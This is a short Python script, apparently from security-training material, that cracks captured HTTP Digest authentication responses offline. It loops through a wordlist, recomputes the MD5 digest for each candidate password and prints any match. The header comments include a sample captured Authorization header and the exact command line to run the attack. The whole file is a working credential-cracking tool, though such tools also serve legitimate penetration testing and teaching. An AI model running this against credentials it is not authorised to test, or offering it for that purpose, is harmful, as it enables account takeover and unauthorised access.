#!/usr/bin/python
# Eric Conrad (@eric_conrad)
#
# Code based on: https://gist.github.com/yesecurity/5fb47f44e289e8bc9c35
# Thank you, yessecurity!
#  https://gist.github.com/yesecurity
#
# Launches dictionary attack vs captured HTTP Digest credentials (taken from
# a PCAP, Burp or ZAP proxy, etc.)
#
# Example credentials:
#
# Authorization: Digest username="conrad", realm="Security542", nonce="es3UMKyKBQA=14c0d9850599ab3d69ad238ae68e7ca167ced5a2", uri="/digest/", algorithm=MD5, response="f4be8f052a172cce14d8c4ab2340f25c", qop=auth, nc=00000001, cnonce="90755b083034b34a"
#
# Resulting commandline:
# 
# ./digest.py --username conrad --wordlist /opt/john/run/password.lst --method GET --uri /digest/ --nc 00000001 --qop auth --realm Security542 --cnonce 90755b083034b34a  --nonce es3UMKyKBQA=14c0d9850599ab3d69ad238ae68e7ca167ced5a2 --response f4be8f052a172cce14d8c4ab2340f25c
#
import sys,itertools,md5,argparse

parser = argparse.ArgumentParser()
parser.add_argument("--username", help="Username",required=True)
parser.add_argument("--wordlist", help="Path to the wordlist",required=True)
parser.add_argument("--method", help="HTTP method,required=True")
parser.add_argument("--nonce", help="nonce",required=True)
parser.add_argument("--cnonce", help="cnonce",required=True)
parser.add_argument("--uri", help="uri",required=True)
parser.add_argument("--qop", help="qop",required=True)
parser.add_argument("--response", help="response",required=True)
parser.add_argument("--nc", help="nc",required=True)
parser.add_argument("--realm", help="realm",required=True)
args = parser.parse_args()

wordlist=args.wordlist
nonce = args.nonce
uri = args.uri
username = args.username
method = args.method
nc = args.nc
qop = args.qop
cnonce = args.cnonce
response = args.response
realm=args.realm

with open(args.wordlist) as f:  
    dictionary = f.read().splitlines()

for password in dictionary:
    h1 = (username+":"+realm+":"+password)
    ha1 = (md5.md5(h1).hexdigest())

    h2 = (method+":"+uri)
    ha2 = (md5.md5(h2).hexdigest())

    resp = (ha1+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+ha2)
    response2 = (md5.md5(resp).hexdigest())

    if response2 == response:
        print "Username = " + username
        print "Password = " + password
